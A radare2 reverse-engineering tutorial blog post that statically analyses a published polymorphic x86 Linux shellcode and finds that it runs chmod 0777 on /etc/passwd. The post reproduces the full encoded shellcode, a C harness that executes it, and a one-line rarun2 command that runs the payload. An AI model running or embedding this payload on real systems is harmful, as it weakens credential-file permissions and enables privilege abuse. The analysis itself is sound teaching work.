+++
date = "2014-09-26T22:41:30+02:00"
draft = false
title = "Adventures with Radare2 #1: A Simple Shellcode Analysis"
slug = "adventures-with-radare2-1-a-simple-shellcode-analysis"
aliases = [
	"adventures-with-radare2-1-a-simple-shellcode-analysis"
]
+++
Posted on July 17, 2011 by Edd, on [canthack.org]( http://canthack.org/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/ ).

Radare2 is an open-source reverse engineering toolkit, consisting of a disassembler, debugger and hex editor. In this article I will show you the basics by reversing some shellcode I found on Project Shellcode.

To put this into context let's briefly discuss what we mean by the term "shellcode", not to be confused with "shellscript", which is something else entirely. "Shellcode" is a term colloquially used to refer to the payload of an exploit. Typically this would be code injected to start a shell.

Project Shellcode is a repository of shellcodes (with source), which I found via reddit.com/r/reverseengineering last month (thanks polsab); let's look at one of the examples found there.
60 Bytes Chmod 777 Polymorphic x86 Linux Shellcode

The first shellcode I happened to look at from projectshellcode was this

```
/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0   _                   __           __       __                   1
1 /' \            __  /'__`\        /\ \__  /'__`\                 0
0/\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___         1
1\/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\        0
0   \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/         1
1    \ \_\ \_\ \_\_\ \ \ \___./\ \.___\\ \__\\ \.___/\ \_\         0
0     \/_/\/_/\/_/\ \_\ \/___/  \/___/ \/__/ \/___/  \/_/          1
1                \ \___./ >> Exploit database separated by         0
0                 \/___/     exploit type (local, remote, DoS, ..) 1
1                                                                  1
0  [+] Site            : Inj3ct0r.com                              0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                    1
0                                                                  0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 60 bytes chmod 777 polymorphic x86 linux shellcode
Date   : Sat Jun  5 16:10:00 2010
Author : gunslinger_ 
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com),
ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
mywisdom (devilzc0de.org), loneferret (offensive-security.com)
*/

/*
root@localhost# ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost# gcc -o polymorphic_chmod polymorphic_chmod.c
chmod.c: In function 'main':
chmod.c:37: warning: incompatible implicit declaration of built-in function ‘strlen’
root@localhost# ./polymorphic_chmod
Length: 64
root@localhost# ls -la /etc/passwd
-rwxrwxrwx 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost# chmod 644 /etc/passwd
root@localhost# ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
*/

#include &lt;stdio.h&gt;

char shellcode[] =
	"\xeb\x11\x5e\x31\xc9\xb1\x27\x80\x6c\x0e"
    "\xff\x35\x80\xe9\x01\x75\xf6\xeb\x05\xe8"
    "\xea\xff\xff\xff\x20\x4a\x66\xf5\xe5\x44"
	"\x90\x66\xfe\x9b\xee\x34\x36\x02\xb5\x66"
    "\xf5\xe5\x36\x66\x10\x02\xb5\x1d\x1b\x34"
    "\x34\x34\x64\x9a\xa9\x98\x64\xa5\x96\xa8"
	"\xa8\xac\x99";

int main(void) {
    fprintf(stdout,"Length:"
        "%d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
	return 0;
}
```

Thanks to gunslinger for allowing me to use this code as an example.

__UPDATE__: Current r2 comes with 'ragg2'a tool designed to construct shellcodes and executes them. That C code can be replaced with a shellscript like this:

```
$ rarun2 -x -B eb115e31c9b127806c0eff3580e90175f6eb05e8eaffffff204a66f5e5449066fe9bee343602b566f5e536661002b51d1b343434649aa99864a596a8a8ac99 
```


The description in comments claims that the code sets the file permissions on /etc/passwd to 777, but you would not know that at a glance. What we do know is that we have an array of bytes initialised as hex, which is then cast to a function pointer and called.

Analysis with Radare2
---------------

So how do we find out what this program does? We could build it and run it, but I won't, as it could remove my home directory for all I know. Instead let us examine it statically using radare2.

First we build a binary:

```
% cc -o shellcode polymorphic_chmod_etc_passwd_777.c
polymorphic_chmod_etc_passwd_777.c: In function 'main':
polymorphic_chmod_etc_passwd_777.c:53: warning: incompatible implicit
declaration of built-in function 'strlen'
```

Next we ignore the warning, and now we load it into radare2:
```
% r2 ./shellcode
 -- In soviet russia radare debugs you!
[0x1c000764]>
```

I started radare2 without -d, so we are running in "static" mode, as opposed to using the debugger built into radare2. Now radare is ready and waiting for commands, so let's get to it.

Radare2 commands tend to be very short, some only one letter long. Type `?` followed by enter to get an overview of what you can do. Suffixing a command with a question mark, will give more detailed information on it's usage.

What we should first do is locate that byte string. Because our binary was not stripped, we have the luxury of knowing what the virtual address of 'main' is. Radare2 uses the concept of "flags" to mark useful locations in binaries. Try typing `f` to see a list of flags. The function main will be flagged as 'sym.main'.

We use the `pd` command to disassemble:

```
[0x1c000764]> pd@sym.main
      0x1c000764  sym.main:
      0x1c000764    0    lea ecx, [esp+0x4]
      0x1c000768    0    and esp, 0xfffffff0
      0x1c00076b    0    push dword [ecx-0x4]
      0x1c00076e    4+   push ebp
      0x1c00076f    8+   mov ebp, esp
      0x1c000771    8    push ecx
      0x1c000772   12+   sub esp, 0x14
      0x1c000775   32+   mov dword [esp], sym.shellcode
      0x1c00077c   32>   call dword imp.strlen
         ; imp.strlen() [1]
      0x1c000781   32    mov edx, 0x3c0031d8
      0x1c000786   32    mov [esp+0x8], eax
      0x1c00078a   32    mov dword [esp+0x4], str.Lengthd
      0x1c000792   32    mov [esp], edx
      0x1c000795   32>   call dword imp.fprintf
         ; imp.fprintf() [2]
      0x1c00079a   32    mov eax, sym.shellcode
      0x1c00079f   32    call eax
```

The `pd` command will disassemble a chunk of code equal to the "block size" (see the 'b' command) and in this case it looks like main was bigger than our block size. Because we know that GCC will make "well-formed" functions, we ask radare2 to analyse this function and print it in its entirety:

```
[0x1c000764]> af@sym.main
[0x1c000764]> pdf@sym.main
/ function: sym.main (75)
|     0x1c000764  sym.main:
|     0x1c000764    0    8d4c2404         lea ecx, [esp+0x4]
|     0x1c000768    0    83e4f0           and esp, 0xfffffff0
|     0x1c00076b    0    ff71fc           push dword [ecx-0x4]
|     0x1c00076e    4+   55               push ebp
|     0x1c00076f    8+   89e5             mov ebp, esp
|     0x1c000771    8    51               push ecx
|     0x1c000772   12+   83ec14           sub esp, 0x14
|     0x1c000775   32+   c704244010003c   mov dword [esp], sym.shellcode
|     0x1c00077c   32>   e86bfdffff       call dword imp.strlen
|        ; imp.strlen() [1]
|     0x1c000781   32    bad831003c       mov edx, 0x3c0031d8
|     0x1c000786   32    89442408         mov [esp+0x8], eax
|     0x1c00078a   32    c74424040100003c mov dword [esp+0x4], str.Lengthd
|     0x1c000792   32    891424           mov [esp], edx
|     0x1c000795   32>   e822fdffff       call dword imp.fprintf
|        ; imp.fprintf() [2]
|     0x1c00079a   32    b84010003c       mov eax, sym.shellcode
|     0x1c00079f   32    ffd0             call eax
|        ; unk()
|     0x1c0007a1   32    b800000000       mov eax, 0x0
|     0x1c0007a6   32    83c414           add esp, 0x14
|     0x1c0007a9   12-   59               pop ecx
|     0x1c0007aa    8-   5d               pop ebp
|     0x1c0007ab    4-   8d61fc           lea esp, [ecx-0x4]
\     0x1c0007ae    4    c3               ret
      ; ------------
```

A quick eyeballing of this code shows us what we need to know. There was enough information in our binary for radare2 to flag the byte string holding the exploit. If you want to see the actual address of this string, you can turn off the asm.filter using the `e` command; this will prevent radare2 from substituting symbols names for constants in disassembly views.

What does the program do with the payload? We see strlen() and printf() being called, but more importantly, we see the address of the shellcode being loaded into eax before being called (load at 0x1c00079a, call at 0x1c00079f). The obvious next step is to examine the payload to get an idea of what it might do:

```
[0x1c000764]> pD 60@sym.shellcode
     ,   0x3c001040  sym.shellcode:
     ,=< 0x3c001040    0    eb11             jmp 0x3c001053 [1]
     |   0x3c001042    0    5e               pop esi
     |   0x3c001043   -4-   31c9             xor ecx, ecx
     |   0x3c001045   -4    b127             mov cl, 0x27
    .--> 0x3c001047   -4    806c0eff35       sub byte [esi+ecx-0x1], 0x35
    ||   0x3c00104c   -4    80e901           sub cl, 0x1
    `==< 0x3c00104f   -4    75f6             jnz 0x3c001047 [2]
   ,===< 0x3c001051   -4    eb05             jmp 0x3c001058 [3]
   | `-> 0x3c001053   -4>   e8eaffffff       call dword 0x3c001042
   | |      ; 0x3c001042() [4]
   `---> 0x3c001058   -4    204a66           and [edx+0x66], cl
         0x3c00105b   -4    f5               cmc
         0x3c00105c   -4    e544             in eax, 0x44
         0x3c00105e   -4    90               nop
         0x3c00105f   -4    66fe9b           o16 invalid
         0x3c001062   -4    ee               out dx, al
         0x3c001063   -4    3436             xor al, 0x36
         0x3c001065   -4    02b566f5e536     add dh, [ebp+0x36e5f566]
         0x3c00106b   -4    661002           o16 adc [edx], al
         0x3c00106e   -4    b51d             mov ch, 0x1d
         0x3c001070   -4    1b3434           sbb esi, [esp+esi]
         0x3c001073   -4 string (5): "444d"
         0x3c001078   -4 hex length=64 delta=2
0x3c001078  64a5 96a8 a8ac 9900 0000 0000 0100 0000
0x3c001088  0100 0000 0400 0000 c001 001c 0500 0000
0x3c001098  8803 001c 0600 0000 5802 001c 0a00 0000
0x3c0010a8  bf00 0000 0b00 0000 1000 0000 1500 0000
```

I used `pD` here so that I could specify exactly how many bytes to disassemble (I chose 60). So what can we say about this? Well at first glance, there are some invalid operations which can't be executed, so that's a bit fishy.

What I will now is do a symbolic execution of this code in my head. We first jump to 0x3c001053, from here we call to 0x3c001042, which happens to be the instruction right after where we came from in the first place. This could be pointless, but bear in mind that the call has pushed the return address of the call onto the stack. And what do you know, they immediately pop the return address into esi. In 32-bit x86 there is no way of getting directly at the program counter; what you have just seen is a well known hack used to get it. The value of the program counter can be used to refer to code/data relative to the payload (remember that the attacker does not know where his/her code will be relocated by the linker).

So now we are at 0x3c001043 with 0x3c001058 in esi. The code zeros ecx by xoring it with itself, before loading 0x27 into the lowest byte of ecx. The next chunk of code which subtracts 0x35 from a [esi+ecx-0x1], for ecx = {0x27, 0x26, ... , 0x1} and we already know the value of esi from earlier. So by my calculations, we need to subtract 0x35 from 0x27 bytes starting at 0x3c001058 so as to emulate the effect of this self modifying code. We can do this using the 'wo' family of commands; let's ask radare2 for help on this:

```
[0x1c000764]> wo?
Usage: wo[asmdxoArl24] [hexpairs] @ addr[:bsize]
Example:
  wox 0x90   ; xor cur block with 0x90
  wox 90     ; xor cur block with 0x90
  wox 0x0203 ; xor cur block with 0203
  woa 02 03  ; add [0203][0203][...] to curblk
Supported operations:
  woa  +=  addition
  wos  -=  substraction
  wom  *=  multiply
  wod  /=  divide
  wox  ^=  xor
  woo  |=  or
  woA  &=  and
  wor  >>= shift right
  wol  <<= shift left
  wo2  2=  2 byte endian swap
  wo4  4=  4 byte endian swap
```

We need to use `wos` so as to subtract a constant from a range of memory addresses, but before that we need to turn on io caching. By default radare2 opens files read-only, unless you give the -w flag. Alternatively we can set the `io.cache` option on, which caches writes in memory; These writes can be reverted or committed as the user pleases, but we will not be using these facilities for this example.

```
[0x1c000764]> e io.cache=true
[0x1c000764]> wos 0x35@0x3c001058:0x27
[0x3c001040]> pd
      ,   0x3c001040  sym.shellcode:
      ,=< 0x3c001040    0    eb11             jmp 0x3c001053 [1]
      |   0x3c001042    0    5e               pop esi
      |   0x3c001043   -4-   31c9             xor ecx, ecx
      |   0x3c001045   -4    b127             mov cl, 0x27
     .--> 0x3c001047   -4    806c0eff35       sub byte [esi+ecx-0x1], 0x35
     ||   0x3c00104c   -4    80e901           sub cl, 0x1
     `==< 0x3c00104f   -4    75f6             jnz 0x3c001047 [2]
    ,===< 0x3c001051   -4    eb05             jmp 0x3c001058 [3]
    | `-> 0x3c001053   -4>   e8eaffffff       call dword 0x3c001042
    | |      ; 0x3c001042() [4]
   ,`---> 0x3c001058   -4    eb15             jmp 0x3c00106f [5]
   |      0x3c00105a   -4    31c0             xor eax, eax
   |      0x3c00105c   -4    b00f             mov al, 0xf
   |      0x3c00105e   -4    5b               pop ebx
   |      0x3c00105f   -8-   31c9             xor ecx, ecx
   |      0x3c001061   -8    66b9ff01         mov cx, 0x1ff
   |      0x3c001065   -8    cd80             int 0x80
   |         ; syscall[0x80][3840]=?
   |      0x3c001067   -8    31c0             xor eax, eax
   |      0x3c001069   -8    b001             mov al, 0x1
   |      0x3c00106b   -8    31db             xor ebx, ebx
   |      0x3c00106d   -8    cd80             int 0x80
   |         ; msync (0x100,0x0,0x1ff)
   `----> 0x3c00106f   -8>   e8e6ffffff       call dword 0x3c00105a
   |         ; 0x3c00105a() [6]
          0x3c001074   -8 string (5): "444d"
          0x3c001079   -8 hex length=64 delta=3
0x3c001079  7061 7373 7764 0055 2720 666f 7220 7265  passwd.U' for re
0x3c001089  646f 0000 0000 0000 0000 0000 0000 0000
0x3c001099  0000 0000 0000 0000 0000 0000 0000 0000
0x3c0010a9  0000 0000 0000 0000 0000 0000 0000 0000
```

And now we see that the instructions following 0x3c001058 are now valid. The first thing that I notice are these 'int 0x80' instructions. On a UNIX like operating system (running on x86/amd64), firing an 0x80 interrupt has a special meaning, it asks the kernel to execute a system call, whose number is held in eax.

By following execution mentally (through a jump and a call), I can tell you that eax takes a value of 15 at 0x3c001065 and 1 at 0x3c00106d. We can identify these Linux system calls by grokking the 32-bit x86 kernel headers, or the easy way, google for them:

[syscall]( http://asm.sourceforge.net/syscall.html )

__NOTE__ actually, r2 supports three different methods for resolving syscalls on a shellcode, so there's no need to check the kernel headers anymore.

* Use your brain
* Use `as` command to analyze syscalls
* Run `esil` emulation to get reg values
* Debug de shellcode by injecting it on a real process with `r2 -d`

So we have a call to chmod(2) at 0x3c001065, followed by a call to exit(2) at 0x3c00106d. We will need to examine the arguments to calls in order to understand what they do. On a Linux system, system call arguments are passed in registers (ebx, ecx, edx, esi, edi, ebp).

Let's look at the call to `chmod(2)`; This call takes two arguments, so we should look in ebx and ecx for a char pointer indicating the path to a file, and a mode_t (which is just an integer really) specifying the mode (or permissions) to change to.

*ebx* is popped from the top of the stack at 0x3c00105e and if we follow execution backwards, we see that the last thing on the stack was a "return address" (0x3c001074) of the call at 0x3c00106f. Ofcourse this is not a return address at all, just a sneaky way to bundle a string into the payload. Let's look at the string using 'ps':

```
[0x1c000764]> ps@0x3c001074
/etc/passwd
```

The second argument of the chmod call is in the ecx register and takes the value `0x1ff`; which in octal, is `0777`. So we have a call `chmod("/etc/passwd", 0777);`. Naughty!

After this the program simply calls the exit(2) system call.

Concluding Comments
--------------

What we have seen is an exploit which modifies itself at runtime in order to resist static disassembly. The technique is not new and is an easy way of preventing hard coded strings (like "/etc/passwd") from being detectable with utilities like `strings(1)` or `rabin2 -z`.

In fact, this exploit should not work on modern operating systems, as the payload was situated in the '.data' section of the binary, which (on any sane OS) can not be both executable and writable. I tried stepping over the call to the payload on my OpenBSD machine and it refused to execute, which is a good thing. 

We explored some of the basic features of radare2, however, we have only scratched the surface. Go check it out at [radare.org]( http://radare.org).

If you fancy something slightly harder, try the same analysis on a stripped binary!

Please let us know if you spot any errors or have any comments. Cheers.
